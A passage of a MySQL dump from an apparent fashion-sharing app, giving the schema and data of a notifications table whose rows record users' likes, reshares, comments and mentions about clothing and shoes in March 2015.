(95, 68, 10, '2015-03-26 00:10:45'),
(96, 68, 21, '2015-03-26 00:11:29'),
(97, 51, 21, '2015-03-26 00:12:10'),
(98, 61, 21, '2015-03-26 00:17:54'),
(99, 60, 150, '2015-03-26 00:43:14'),
(100, 69, 21, '2015-03-26 00:59:45'),
(101, 54, 21, '2015-03-26 03:14:29'),
(102, 69, 10, '2015-03-26 03:22:56'),
(103, 73, 10, '2015-03-26 07:13:34'),
(104, 71, 10, '2015-03-26 07:15:36'),
(105, 72, 10, '2015-03-26 07:16:14'),
(106, 5, 174, '2015-03-26 07:17:59'),
(107, 66, 10, '2015-03-26 07:19:09'),
(108, 65, 10, '2015-03-26 07:20:47'),
(109, 62, 10, '2015-03-26 07:22:36'),
(112, 49, 162, '2015-03-26 13:15:39'),
(113, 76, 10, '2015-03-26 17:11:28'),
(114, 75, 10, '2015-03-26 17:15:13'),
(115, 71, 59, '2015-03-26 20:28:36'),
(116, 48, 59, '2015-03-26 20:33:53'),
(117, 80, 10, '2015-03-26 21:13:04'),
(118, 77, 10, '2015-03-26 21:14:48'),
(119, 78, 10, '2015-03-26 21:16:29'),
(120, 79, 10, '2015-03-26 21:17:18'),
(121, 76, 21, '2015-03-27 00:30:16'),
(122, 75, 21, '2015-03-27 00:31:13'),
(123, 81, 10, '2015-03-27 00:34:21'),
(124, 71, 150, '2015-03-27 02:10:16'),
(125, 57, 58, '2015-03-27 03:01:07'),
(126, 82, 21, '2015-03-27 05:34:14'),
(127, 80, 21, '2015-03-27 06:02:57'),
(128, 81, 21, '2015-03-27 06:05:04'),
(129, 46, 181, '2015-03-27 21:59:27'),
(130, 84, 10, '2015-03-27 22:45:31'),
(131, 83, 10, '2015-03-27 22:46:41'),
(132, 84, 21, '2015-03-27 23:49:09'),
(133, 49, 147, '2015-03-28 04:27:36'),
(134, 91, 10, '2015-03-28 04:28:02'),
(135, 77, 147, '2015-03-28 05:23:58'),
(136, 92, 10, '2015-03-28 05:52:35'),
(137, 94, 10, '2015-03-28 09:15:20'),
(138, 96, 10, '2015-03-28 14:16:57'),
(139, 97, 10, '2015-03-28 14:17:04'),
(140, 95, 10, '2015-03-28 14:17:17'),
(141, 94, 21, '2015-03-28 14:20:13'),
(142, 92, 21, '2015-03-28 14:24:21'),
(143, 99, 10, '2015-03-28 15:17:42'),
(144, 102, 10, '2015-03-28 17:53:40'),
(145, 86, 10, '2015-03-28 18:00:39'),
(146, 87, 10, '2015-03-28 18:00:51'),
(147, 88, 10, '2015-03-28 18:01:41'),
(148, 89, 10, '2015-03-28 18:02:27'),
(149, 90, 10, '2015-03-28 18:02:46'),
(150, 103, 10, '2015-03-28 20:16:08'),
(151, 90, 21, '2015-03-29 00:47:05'),
(152, 89, 21, '2015-03-29 00:51:15'),
(153, 88, 21, '2015-03-29 00:52:07'),
(154, 102, 21, '2015-03-29 00:53:30'),
(155, 106, 10, '2015-03-29 08:08:08'),
(156, 108, 21, '2015-03-29 15:02:51');

-- --------------------------------------------------------

--
-- Table structure for table `notifications`
--

CREATE TABLE IF NOT EXISTS `notifications` (
`notification_id` int(11) NOT NULL,
  `from_id` int(11) DEFAULT NULL,
  `to_id` int(11) NOT NULL,
  `post_id` int(11) NOT NULL,
  `type` varchar(20) DEFAULT NULL,
  `message` varchar(1024) DEFAULT NULL,
  `content` text,
  `created` datetime DEFAULT NULL,
  `read` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=551 ;

--
-- Dumping data for table `notifications`
--

INSERT INTO `notifications` (`notification_id`, `from_id`, `to_id`, `post_id`, `type`, `message`, `content`, `created`, `read`) VALUES
(1, 21, 10, 1, 'like', '', '{"post_id":"1","user_id":"21"}', '2015-03-14 11:49:28', 1),
(2, 21, 10, 2, 'like', '', '{"post_id":"2","user_id":"21"}', '2015-03-14 11:49:40', 1),
(3, 21, 10, 2, 'comment', '', 'looking sharp!', '2015-03-14 11:49:59', 1),
(4, 141, 10, 2, 'comment', '', 'Cool shoes !', '2015-03-15 11:33:22', 1),
(5, 10, 141, 2, 'mention', '', '@steve99 yeah it''s pretty trendy \\ud83d\\ude1d', '2015-03-15 12:09:49', 1),
(6, 56, 10, 2, 'like', '', '{"post_id":"2","user_id":"56"}', '2015-03-16 07:04:52', 1),
(7, 10, 21, 5, 'like', '', '{"post_id":"5","user_id":"10"}', '2015-03-17 04:48:30', 1),
(8, 10, 21, 5, 'comment', '', 'the blue-white-pink color combo is cute', '2015-03-17 04:50:24', 1),
(9, 10, 21, 5, 'reshare', '', '{"post_id":"5","user_id":"10"}', '2015-03-17 04:50:32', 1),
(10, 10, 21, 6, 'like', '', '{"post_id":"6","user_id":"10"}', '2015-03-18 19:15:10', 1),
(11, 147, 21, 6, 'like', '', '{"post_id":"6","user_id":"147"}', '2015-03-19 00:48:32', 1),
(12, 147, 21, 5, 'like', '', '{"post_id":"5","user_id":"147"}', '2015-03-19 00:48:38', 1),
(13, 147, 21, 5, 'reshare', '', '{"post_id":"5","user_id":"147"}', '2015-03-19 00:49:16', 1),
(14, 49, 21, 5, 'like', '', '{"post_id":"5","user_id":"49"}', '2015-03-19 21:58:01', 1),
(15, 49, 10, 4, 'like', '', '{"post_id":"4","user_id":"49"}', '2015-03-19 22:05:44', 1),
(16, 49, 10, 3, 'comment', '', '@herbertyang looks pretty nice. How much it is?', '2015-03-20 02:35:26', 1),
(17, 49, 10, 3, 'mention', '', '@herbertyang looks pretty nice. How much it is?', '2015-03-20 02:35:26', 1),
(18, 10, 49, 3, 'mention', '', '@xizhang can''t remember exactly...about $50-70 range I think ', '2015-03-20 02:53:54', 1),
(19, 49, 21, 5, 'comment', '', '@herbertyang the highly saturated colors are the new trend. seeing more and more people wearing these type of shoes on street.', '2015-03-20 03:53:41', 1),
(20, 49, 10, 5, 'mention', '', '@herbertyang the highly saturated colors are the new trend. seeing more and more people wearing these type of shoes on street.', '2015-03-20 03:53:41', 1),
(21, 150, 10, 4, 'like', '', '{"post_id":"4","user_id":"150"}', '2015-03-20 15:01:34', 1),
(22, 150, 10, 4, 'comment', '', '\\u26a1\\ufe0f', '2015-03-20 15:01:47', 1),
(23, 10, 150, 8, 'like', '', '{"post_id":"8","user_id":"10"}', '2015-03-20 15:16:55', 1),
(24, 10, 150, 8, 'comment', '', 'like mother like daughter \\ud83d\\udc4d', '2015-03-20 15:19:21', 1),
(25, 49, 10, 3, 'comment', '', '@herbertyang that is pretty deal. I will grab one next time when I go to burlington mall.', '2015-03-20 17:45:50', 1),
(26, 49, 10, 3, 'mention', '', '@herbertyang that is pretty deal. I will grab one next time when I go to burlington mall.', '2015-03-20 17:45:51', 1),
(27, 10, 49, 3, 'mention', '', '@xizhang \\ud83d\\ude1d yeah I think it''s a good deal. Over here people are pretty casual. Pants like this is convenient.', '2015-03-20 17:47:34', 1),
(28, 49, 10, 3, 'reshare', '', '{"post_id":"3","user_id":"49"}', '2015-03-21 00:04:39', 1),
(29, 49, 10, 3, 'comment', '', '@herbertyang is this type of pant good for jogging? ', '2015-03-21 00:05:56', 1),
(30, 49, 10, 3, 'mention', '', '@herbertyang is this type of pant good for jogging? ', '2015-03-21 00:05:56', 1),
(31, 10, 150, 4, 'mention', '', '@zxjulia what is this lighting about? ', '2015-03-21 00:07:05', 1),
(32, 10, 49, 3, 'mention', '', '@xizhang it definite is. it''s very light and breathable. I ran with it in the cold weather in Shanghai.', '2015-03-21 00:08:07', 1),
(33, 150, 10, 4, 'comment', '', '\\u7626\\u6210\\u4e00\\u9053\\u95ea\\u7535\\u5566\\uff01', '2015-03-21 00:08:28', 1),
(34, 10, 150, 4, 'mention', '', '@zxjulia need to do more work \\ud83d\\ude33', '2015-03-21 00:38:48', 1),
(35, 10, 150, 4, 'comment_like', '', '{"comment_id":"15","user_id":"10"}', '2015-03-21 00:38:52', 1),
(36, 49, 150, 8, 'like', '', '{"post_id":"8","user_id":"49"}', '2015-03-21 00:58:22', 1),
(37, 21, 150, 8, 'like', '', '{"post_id":"8","user_id":"21"}', '2015-03-21 01:01:53', 1),
(38, 21, 150, 8, 'comment', '', 'very pretty!', '2015-03-21 01:02:34', 1),
(39, 21, 150, 8, 'reshare', '', '{"post_id":"8","user_id":"21"}', '2015-03-21 01:02:50', 1),
(40, 150, 21, 6, 'like', '', '{"post_id":"6","user_id":"150"}', '2015-03-21 01:37:24', 1),
(41, 21, 149, 9, 'like', '', '{"post_id":"9","user_id":"21"}', '2015-03-21 09:09:40', 1),
(42, 21, 149, 9, 'comment', '', 'very pretty! I bought one pair in black for my mom and she totally loves them. they are very good at keeping you warm in the chilly Shanghai winter. ', '2015-03-21 09:11:51', 1),
(43, 150, 149, 9, 'like', '', '{"post_id":"9","user_id":"150"}', '2015-03-21 10:46:34', 1),
(44, 150, 21, 6, 'comment', '', 'I wish I have one like this\\ud83d\\ude0d\\uff01', '2015-03-21 10:54:34', 1),
(45, 150, 21, 6, 'like', '', '{"post_id":"6","user_id":"150"}', '2015-03-21 10:56:16', 1),
(46, 150, 21, 6, 'comment', '', '\\ud83d\\ude0d', '2015-03-21 10:56:30', 1),
(47, 10, 21, 11, 'like', '', '{"post_id":"11","user_id":"10"}', '2015-03-21 15:23:53', 1),
(48, 10, 21, 10, 'like', '', '{"post_id":"10","user_id":"10"}', '2015-03-21 15:24:18', 1),
(49, 10, 149, 9, 'like', '', '{"post_id":"9","user_id":"10"}', '2015-03-21 15:24:28', 1),
(50, 10, 21, 11, 'comment', '', 'wow! beautiful tights indeed! \\ud83d\\udc4f\\ud83d\\udc4f', '2015-03-21 15:25:50', 1),
(51, 10, 21, 10, 'comment', '', 'it''s really tiny when wrapped up', '2015-03-21 15:27:01', 1),
(52, 10, 147, 13, 'like', '', '{"post_id":"13","user_id":"10"}', '2015-03-22 00:55:07', 1),
(53, 10, 21, 6, 'comment', '', '@zxjulia yeah this piece is really neat - you can wrap it into your hands when running', '2015-03-22 00:57:05', 1),
(54, 10, 150, 6, 'mention', '', '@zxjulia yeah this piece is really neat - you can wrap it into your hands when running', '2015-03-22 00:57:05', 1),
(55, 10, 147, 13, 'reshare', '', '{"post_id":"13","user_id":"10"}', '2015-03-22 00:57:32', 1),
(56, 10, 147, 13, 'comment', '', 'where did you buy this pair?', '2015-03-22 00:58:56', 1),
(57, 21, 147, 13, 'like', '', '{"post_id":"13","user_id":"21"}', '2015-03-22 00:59:21', 1),
(58, 147, 10, 13, 'mention', '', '@herbertyang from K11 @ HK', '2015-03-22 01:04:41', 1),
(59, 10, 147, 13, 'comment', '', '@echohwj there is another K11 in Hong Kong as well?', '2015-03-22 01:05:26', 1),
(60, 10, 147, 13, 'mention', '', '@echohwj there is another K11 in Hong Kong as well?', '2015-03-22 01:05:26', 1),
(61, 147, 10, 13, 'mention', '', '@herbertyang yeah, in Tsim Sha Tsui. One of my favorite mall in HK.', '2015-03-22 01:41:51', 1),
(62, 147, 21, 10, 'like', '', '{"post_id":"10","user_id":"147"}', '2015-03-22 01:44:40', 1),
(63, 21, 147, 13, 'comment', '', '@k11 is done by a Hong Kong developer. They are more artsy than most other malls.', '2015-03-22 01:57:42', 1),
(64, 21, 147, 13, 'comment', '', '@herbertyang K11 is done by a HK developer. they are more artsy than most other malls. ', '2015-03-22 01:59:20', 1),
(65, 21, 10, 13, 'mention', '', '@herbertyang K11 is done by a HK developer. they are more artsy than most other malls. ', '2015-03-22 01:59:20', 1),
(66, 21, 147, 13, 'comment', '', 'good to know that these shoes run narrow. won''t work for me although they look great on you!', '2015-03-22 02:00:53', 1),
(67, 10, 147, 13, 'comment_like', '', '{"comment_id":"27","user_id":"10"}', '2015-03-22 02:07:10', 1),
(68, 10, 147, 13, 'comment', '', 'did you get them to do a full measurement on your feet in the #asics store? they have this cool service to measure your foot size for free', '2015-03-22 02:19:26', 1),
(69, 10, 21, 10, 'comment', '', 'this three-pic layout is pretty useful', '2015-03-22 02:22:12', 1),
(70, 10, 21, 11, 'comment', '', '@mmm we should encourage users to do more posting right from fitting rooms in shopping mall stores. they have mirrors there.', '2015-03-22 02:28:32', 1),
(71, 10, 33, 11, 'mention', '', '@mmm we should encourage users to do more posting right from fitting rooms in shopping mall stores. they have mirrors there.', '2015-03-22 02:28:32', 1),
(72, 10, 141, 2, 'comment_like', '', '{"comment_id":"2","user_id":"10"}', '2015-03-22 02:42:01', 1),
(73, 10, 32, 15, 'like', '', '{"post_id":"15","user_id":"10"}', '2015-03-22 04:29:37', 1),
(74, 10, 32, 15, 'comment', '', 'no fitting report? no brand?', '2015-03-22 04:31:11', 1),
(75, 10, 32, 15, 'comment', '', 'year it looks very light ', '2015-03-22 04:39:55', 1),
(76, 10, 32, 15, 'comment', '', 'how much is it?', '2015-03-22 04:43:51', 1),
(77, 10, 49, 3, 'mention', '', '@xizhang our lower BMS is only 42%! \\ud83d\\ude31 how can we be so different there...', '2015-03-22 04:53:35', 1),
(78, 10, 49, 5, 'comment_like', '', '{"comment_id":"7","user_id":"10"}', '2015-03-22 04:55:20', 1),
(79, 10, 21, 11, 'comment', '', '@katieavd hello there! look who this is! \\ud83d\\ude1d', '2015-03-22 06:55:56', 1),
(80, 10, 158, 11, 'mention', '', '@katieavd hello there! look who this is! \\ud83d\\ude1d', '2015-03-22 06:55:56', 1),
(81, 147, 21, 11, 'comment', '', 'The first one is really pretty on you!', '2015-03-22 12:24:17', 1),
(82, 21, 147, 11, 'mention', '', '@echohwj I''m sure you''ll look super hot in those tights! \\ud83d\\ude09', '2015-03-22 12:51:36', 1),
(83, 21, 147, 11, 'mention', '', '@echohwj I think you''ll look super hot in these tights - they are meant for girls like you! \\ud83d\\ude09', '2015-03-22 12:53:20', 1),
(84, 147, 10, 13, 'mention', '', '@herbertyang Really? Sounds interesting. Will try and then report in Linkqlo then.', '2015-03-22 12:56:24', 1),
(85, 35, 10, 1, 'like', '', '{"post_id":"1","user_id":"35"}', '2015-03-22 14:30:12', 1),
(86, 10, 35, 16, 'like', '', '{"post_id":"16","user_id":"10"}', '2015-03-22 16:16:33', 1),
(87, 10, 35, 16, 'comment', '', 'hidden heel? LOL', '2015-03-22 16:17:25', 1),
(88, 10, 59, 17, 'like', '', '{"post_id":"17","user_id":"10"}', '2015-03-22 16:18:12', 1),
(89, 10, 59, 17, 'comment', '', 'I like its light blue color too', '2015-03-22 16:20:13', 1),
(90, 49, 10, 3, 'comment', '', '@herbertyang I was wondering the same thing..;-) ', '2015-03-22 16:48:35', 1),
(91, 49, 10, 3, 'mention', '', '@herbertyang I was wondering the same thing..;-) ', '2015-03-22 16:48:35', 1),
(92, 10, 49, 18, 'like', '', '{"post_id":"18","user_id":"10"}', '2015-03-22 16:49:28', 1),
(93, 10, 49, 18, 'comment', '', 'on fire! ', '2015-03-22 16:50:15', 1),
(94, 10, 59, 19, 'like', '', '{"post_id":"19","user_id":"10"}', '2015-03-22 16:53:09', 1),
(95, 10, 59, 19, 'comment', '', 'a terrifying shot! where is your head? \\ud83d\\ude31', '2015-03-22 16:53:38', 1),
(96, 10, 59, 19, 'comment', '', 'a bit too large for you? you look just fine in it', '2015-03-22 16:55:07', 1),
(100, 10, 146, 21, 'like', '', '{"post_id":"21","user_id":"10"}', '2015-03-22 17:21:04', 1),
(101, 10, 146, 21, 'comment', '', 'fancy sneakers!', '2015-03-22 17:21:33', 1),
(102, 10, 21, 11, 'comment', '', '@namiko konnichiwa! \\ud83d\\ude0a ', '2015-03-22 17:33:02', 1),
(103, 10, 159, 11, 'mention', '', '@namiko konnichiwa! \\ud83d\\ude0a ', '2015-03-22 17:33:02', 1),
(104, 10, 21, 11, 'comment_like', '', '{"comment_id":"41","user_id":"10"}', '2015-03-22 17:33:09', 1),
(105, 10, 21, 11, 'comment', '', '@echohwj yeah this is vet much loud and clear fashion statement', '2015-03-22 17:33:42', 1),
(106, 10, 147, 11, 'mention', '', '@echohwj yeah this is vet much loud and clear fashion statement', '2015-03-22 17:33:42', 1),
(107, 10, 147, 13, 'comment', '', '@echohwj yeah #asics has this fantastic service..try it out with them next time..it''s very high-tech', '2015-03-22 17:42:09', 1),
(108, 10, 147, 13, 'mention', '', '@echohwj yeah #asics has this fantastic service..try it out with them next time..it''s very high-tech', '2015-03-22 17:42:09', 1),
(109, 10, 59, 22, 'like', '', '{"post_id":"22","user_id":"10"}', '2015-03-22 17:42:33', 1),
(110, 10, 154, 23, 'like', '', '{"post_id":"23","user_id":"10"}', '2015-03-22 19:20:25', 1),
(111, 10, 154, 27, 'like', '', '{"post_id":"27","user_id":"10"}', '2015-03-22 19:21:13', 1),
(112, 10, 154, 23, 'comment', '', '@wildsheepchase JM is back in town', '2015-03-22 19:32:58', 1),
(113, 10, 21, 23, 'mention', '', '@wildsheepchase JM is back in town', '2015-03-22 19:32:58', 1),
(114, 10, 150, 8, 'comment', '', '@wangyili ZX is here with her daughter', '2015-03-22 20:57:47', 1),
(115, 10, 59, 8, 'mention', '', '@wangyili ZX is here with her daughter', '2015-03-22 20:57:47', 1),
(116, 10, 49, 29, 'comment', '', 'you still keep playing basketball? good for you! hard for me to find a pug team here', '2015-03-22 20:58:48', 1),
(117, 10, 49, 29, 'like', '', '{"post_id":"29","user_id":"10"}', '2015-03-22 20:58:52', 1),
(118, 10, 59, 30, 'like', '', '{"post_id":"30","user_id":"10"}', '2015-03-22 22:06:06', 1),
(119, 59, 10, 19, 'mention', '', '@herbertyang  It''s too long.', '2015-03-22 23:47:35', 1),
(120, 10, 59, 19, 'comment', '', '@wangyili yeah the sleeves ', '2015-03-22 23:53:47', 1),
(121, 10, 59, 19, 'mention', '', '@wangyili yeah the sleeves ', '2015-03-22 23:53:47', 1),
(122, 21, 35, 16, 'like', '', '{"post_id":"16","user_id":"21"}', '2015-03-23 00:06:29', 1),
(123, 21, 146, 21, 'like', '', '{"post_id":"21","user_id":"21"}', '2015-03-23 00:07:21', 1),
(124, 10, 160, 31, 'like', '', '{"post_id":"31","user_id":"10"}', '2015-03-23 00:07:56', 1),
(125, 21, 59, 17, 'comment', '', 'Tiffany blue - very pretty!', '2015-03-23 00:09:42', 1),
(126, 21, 59, 19, 'comment', '', 'very helpful review!', '2015-03-23 00:12:54', 1),
(127, 21, 59, 22, 'like', '', '{"post_id":"22","user_id":"21"}', '2015-03-23 00:13:46', 1),
(128, 21, 160, 32, 'like', '', '{"post_id":"32","user_id":"21"}', '2015-03-23 00:15:00', 1),
(129, 21, 160, 32, 'comment', '', 'so pretty!', '2015-03-23 00:15:15', 1),
(130, 10, 160, 32, 'like', '', '{"post_id":"32","user_id":"10"}', '2015-03-23 00:15:22', 1),
(131, 10, 160, 32, 'comment', '', '@wildsheepchase yeah indeed', '2015-03-23 00:15:33', 1),
(132, 10, 21, 32, 'mention', '', '@wildsheepchase yeah indeed', '2015-03-23 00:15:33', 1),
(133, 21, 147, 34, 'like', '', '{"post_id":"34","user_id":"21"}', '2015-03-23 01:33:00', 1),
(134, 21, 147, 34, 'comment', '', 'Roshe rocks!', '2015-03-23 01:33:25', 1),
(135, 10, 146, 33, 'like', '', '{"post_id":"33","user_id":"10"}', '2015-03-23 02:58:36', 1),
(136, 10, 146, 33, 'comment', '', 'never knew this brand before...it looks really good on you!', '2015-03-23 02:59:23', 1),
(137, 10, 147, 34, 'like', '', '{"post_id":"34","user_id":"10"}', '2015-03-23 02:59:42', 1),
(138, 10, 147, 34, 'comment', '', '@wildsheepchase what is Roche?', '2015-03-23 03:00:28', 1),
(139, 10, 21, 34, 'mention', '', '@wildsheepchase what is Roche?', '2015-03-23 03:00:29', 1),
(140, 10, 154, 27, 'comment', '', 'is it also good for badminton court, which requires white sole?', '2015-03-23 03:01:38', 1),
(141, 10, 154, 26, 'like', '', '{"post_id":"26","user_id":"10"}', '2015-03-23 03:02:09', 1),
(142, 10, 154, 26, 'comment', '', 'oh yeah finally, #lululemon ! there will be many hard-core fans flocking here soon', '2015-03-23 03:02:49', 1),
(143, 10, 154, 25, 'like', '', '{"post_id":"25","user_id":"10"}', '2015-03-23 03:03:36', 1),
(144, 10, 154, 25, 'comment', '', 'did you get it from the #lululemon store on University Ave?', '2015-03-23 03:04:06', 1),
(145, 10, 154, 25, 'comment', '', '@wildsheepchase JM is also a #lululemon fan', '2015-03-23 03:04:30', 1),
(146, 10, 21, 25, 'mention', '', '@wildsheepchase JM is also a #lululemon fan', '2015-03-23 03:04:30', 1),
(147, 10, 154, 24, 'comment', '', 'the thumb holes on sleeves are neat..I like them too', '2015-03-23 03:05:26', 1),
(148, 10, 154, 24, 'like', '', '{"post_id":"24","user_id":"10"}', '2015-03-23 03:05:30', 1),
(149, 10, 154, 24, 'comment', '', 'I think I have the same running piece from #nike ', '2015-03-23 03:06:03', 1),
(150, 10, 154, 23, 'comment', '', 'the chest pocket design is ... an interesting one \\ud83d\\ude15', '2015-03-23 03:07:12', 1),
(151, 10, 154, 23, 'comment', '', '@thomas what up dog', '2015-03-23 03:08:50', 1),
(152, 10, 146, 23, 'mention', '', '@thomas what up dog', '2015-03-23 03:08:50', 1),
(153, 10, 146, 33, 'comment', '', 'judging by our low BMS for upper and lower body, I have a lot of weight to lose \\ud83d\\ude27', '2015-03-23 03:10:44', 1),
(154, 10, 59, 30, 'comment', '', 'evidently, you have a career in modeling ', '2015-03-23 03:11:45', 1),
(155, 10, 59, 22, 'comment', '', 'it looks more like a walking shoes than running shoes...or no? @wildsheepchase ', '2015-03-23 03:13:05', 1),
(156, 10, 21, 22, 'mention', '', 'it looks more like a walking shoes than running shoes...or no? @wildsheepchase ', '2015-03-23 03:13:05', 1),
(157, 10, 145, 35, 'like', '', '{"post_id":"35","user_id":"10"}', '2015-03-23 03:13:25', 1),
(158, 10, 145, 35, 'comment', '', 'wow! this is a landmark event! you made it man! ', '2015-03-23 03:13:52', 1),
(159, 21, 59, 22, 'comment', '', '@herbertyang definitely pro running shoes!', '2015-03-23 03:14:31', 1),
(160, 21, 10, 22, 'mention', '', '@herbertyang definitely pro running shoes!', '2015-03-23 03:14:31', 1),
(161, 10, 145, 35, 'comment', '', 'try to attach a fitting report next time, so that the brand can be recorded and you can review it in more details.', '2015-03-23 03:15:05', 1),
(162, 10, 145, 35, 'comment', '', '@echohwj @wildsheepchase @thomas @linglan I''m in tears...Mr. Guo has arrived', '2015-03-23 03:16:27', 1),
(163, 10, 147, 35, 'mention', '', '@echohwj @wildsheepchase @thomas @linglan I''m in tears...Mr. Guo has arrived', '2015-03-23 03:16:27', 1),
(164, 10, 21, 35, 'mention', '', '@echohwj @wildsheepchase @thomas @linglan I''m in tears...Mr. Guo has arrived', '2015-03-23 03:16:27', 1),
(165, 10, 146, 35, 'mention', '', '@echohwj @wildsheepchase @thomas @linglan I''m in tears...Mr. Guo has arrived', '2015-03-23 03:16:27', 1),
(166, 10, 160, 35, 'mention', '', '@echohwj @wildsheepchase @thomas @linglan I''m in tears...Mr. Guo has arrived', '2015-03-23 03:16:27', 0),
(167, 10, 145, 35, 'comment', '', 'somehow I feel Buddha is in presence...', '2015-03-23 03:16:59', 1),
(168, 21, 154, 25, 'comment', '', 'glad that Lululemon men is also gaining traction. they really have awesome products, don''t they? I like it so much that I bought its stocks, haha!', '2015-03-23 03:17:44', 1),
(169, 10, 59, 22, 'comment', '', '@wildsheepchase we have too many #nike, not enough #asics ', '2015-03-23 03:17:54', 1),
(170, 10, 21, 22, 'mention', '', '@wildsheepchase we have too many #nike, not enough #asics ', '2015-03-23 03:17:54', 1),
(171, 147, 145, 35, 'comment', '', 'A big day!', '2015-03-23 03:17:55', 1),
(172, 21, 145, 35, 'comment', '', 'what a holy shot! Namaste... ', '2015-03-23 03:19:23', 1),
(173, 21, 145, 35, 'comment', '', 'your holiness, how did you achieve the halo effect? very skillful! ', '2015-03-23 03:20:27', 1),
(174, 10, 141, 1, 'mention', '', '@steve99 yo! we need more from you! you are armored from toes to teeth with premium brands. ', '2015-03-23 03:21:51', 0),
(175, 10, 49, 3, 'mention', '', '@xizhang I need to lose weight - that''s what it is \\ud83d\\ude25', '2015-03-23 03:26:31', 1),
(176, 10, 21, 5, 'comment', '', '@echohwj zoom in when shooting photo for the details', '2015-03-23 03:35:08', 1),
(177, 10, 147, 5, 'mention', '', '@echohwj zoom in when shooting photo for the details', '2015-03-23 03:35:08', 1),
(178, 147, 21, 5, 'comment', '', '@herbertyang Got it.', '2015-03-23 03:36:25', 1),
(179, 147, 10, 5, 'mention', '', '@herbertyang Got it.', '2015-03-23 03:36:25', 1),
(180, 10, 147, 5, 'comment_like', '', '{"comment_id":"95","user_id":"10"}', '2015-03-23 03:36:52', 1),
(181, 147, 145, 35, 'like', '', '{"post_id":"35","user_id":"147"}', '2015-03-23 04:06:31', 1),
(182, 10, 149, 9, 'comment', '', '@wildsheepchase is the the same pair for your mom? but @raichu ''s one looks ... so much cooler \\ud83d\\ude09', '2015-03-23 04:16:17', 1),
(183, 10, 21, 9, 'mention', '', '@wildsheepchase is the the same pair for your mom? but @raichu ''s one looks ... so much cooler \\ud83d\\ude09', '2015-03-23 04:16:17', 1),
(184, 10, 149, 9, 'mention', '', '@wildsheepchase is the the same pair for your mom? but @raichu ''s one looks ... so much cooler \\ud83d\\ude09', '2015-03-23 04:16:17', 1),
(185, 21, 149, 9, 'comment', '', '@herbertyang I know. these Roshe boots are very versatile. the colorful ones are super cool while the black ones are the only color that my mom would accept. ', '2015-03-23 04:18:19', 1),
(186, 21, 10, 9, 'mention', '', '@herbertyang I know. these Roshe boots are very versatile. the colorful ones are super cool while the black ones are the only color that my mom would accept. ', '2015-03-23 04:18:20', 1),
(187, 21, 160, 32, 'comment', '', 'what''s the fabric? machine washable?', '2015-03-23 04:19:43', 0),
(188, 21, 147, 34, 'comment', '', '@herbertyang Roshe is the name of this model, inspired by Japanese zen. You have one as well - the red Flyknit ones. ', '2015-03-23 04:21:27', 1),
(189, 21, 10, 34, 'mention', '', '@herbertyang Roshe is the name of this model, inspired by Japanese zen. You have one as well - the red Flyknit ones. ', '2015-03-23 04:21:27', 1),
(190, 21, 147, 34, 'comment', '', 'I love the black dress, too. looking super cute with Roshe! ', '2015-03-23 04:22:37', 1),
(191, 147, 21, 34, 'mention', '', '@wildsheepchase I bought it from ZARA at a super nice price-about 20 dollars.', '2015-03-23 04:25:36', 1),
(192, 10, 21, 35, 'comment_like', '', '{"comment_id":"89","user_id":"10"}', '2015-03-23 04:58:13', 1),
(193, 10, 145, 35, 'comment', '', '@echohwj you can reply me by just clicking on my comment ', '2015-03-23 04:58:56', 1),
(194, 10, 147, 35, 'mention', '', '@echohwj you can reply me by just clicking on my comment ', '2015-03-23 04:58:56', 1),
(195, 147, 145, 35, 'comment', '', '@herbertyang like this:)', '2015-03-23 05:00:02', 1),
(196, 147, 10, 35, 'mention', '', '@herbertyang like this:)', '2015-03-23 05:00:02', 1),
(197, 10, 149, 9, 'comment', '', '@wildsheepchase I see. The furry inner layer is nice. ', '2015-03-23 05:01:33', 1),
(198, 10, 21, 9, 'mention', '', '@wildsheepchase I see. The furry inner layer is nice. ', '2015-03-23 05:01:33', 1),
(199, 10, 145, 35, 'comment', '', '@echohwj yeah you got it \\ud83d\\ude0a', '2015-03-23 05:01:53', 1),
(200, 10, 147, 35, 'mention', '', '@echohwj yeah you got it \\ud83d\\ude0a', '2015-03-23 05:01:53', 1),
(201, 150, 49, 18, 'like', '', '{"post_id":"18","user_id":"150"}', '2015-03-23 06:16:44', 1),
(202, 10, 21, 10, 'comment', '', '@vickyzhao looking familiar?', '2015-03-23 10:04:54', 1),
(203, 10, 161, 10, 'mention', '', '@vickyzhao looking familiar?', '2015-03-23 10:04:54', 1),
(204, 161, 21, 10, 'comment', '', 'I'' m struggling whether I should follow her. now that u confirmed, following', '2015-03-23 10:39:11', 1),
(205, 161, 21, 11, 'comment', '', 'I like the right two anyway. ', '2015-03-23 10:45:22', 1),
(206, 161, 21, 11, 'comment', '', '@vickyzhao I mean the two in the left. black is safe but boring', '2015-03-23 10:47:32', 1),
(207, 21, 161, 11, 'mention', '', '@vickyzhao good to know - just when I thought I could save some money... ', '2015-03-23 11:14:16', 1),
(208, 10, 33, 36, 'like', '', '{"post_id":"36","user_id":"10"}', '2015-03-23 11:31:10', 1),
(209, 49, 10, 3, 'comment', '', '@herbertyang I was about to say that.. interestingly, my weight has been hovering around 160 pounds in past 10 years.', '2015-03-23 16:34:52', 1),
(210, 49, 10, 3, 'mention', '', '@herbertyang I was about to say that.. interestingly, my weight has been hovering around 160 pounds in past 10 years.', '2015-03-23 16:34:52', 1),
(211, 49, 10, 29, 'mention', '', '@herbertyang really? I thought I would be easier because my outdoor friendly weather in Bay Area.', '2015-03-23 16:35:31', 1),
(212, 10, 49, 3, 'mention', '', '@xizhang my weight is more than that...slightly \\ud83d\\ude13', '2015-03-23 17:22:02', 1),
(213, 10, 153, 37, 'like', '', '{"post_id":"37","user_id":"10"}', '2015-03-23 18:52:21', 1),
(214, 10, 153, 37, 'comment_like', '', '{"comment_id":"114","user_id":"10"}', '2015-03-23 18:52:29', 1),
(215, 10, 153, 37, 'comment', '', '@ryanyang cool! you can also upload multiple photos in one post.\\ud83d\\udc4d\\ud83d\\udc4d', '2015-03-23 18:53:52', 1),
(216, 10, 153, 37, 'mention', '', '@ryanyang cool! you can also upload multiple photos in one post.\\ud83d\\udc4d\\ud83d\\udc4d', '2015-03-23 18:53:52', 1),
(217, 10, 153, 37, 'comment', '', 'very useful review! \\ud83d\\udc4a\\ud83d\\udc4a', '2015-03-23 18:55:57', 1),
(218, 10, 146, 33, 'comment', '', '@ryanyang looks who''s here', '2015-03-23 18:56:28', 1),
(219, 10, 153, 33, 'mention', '', '@ryanyang looks who''s here', '2015-03-23 18:56:28', 1),
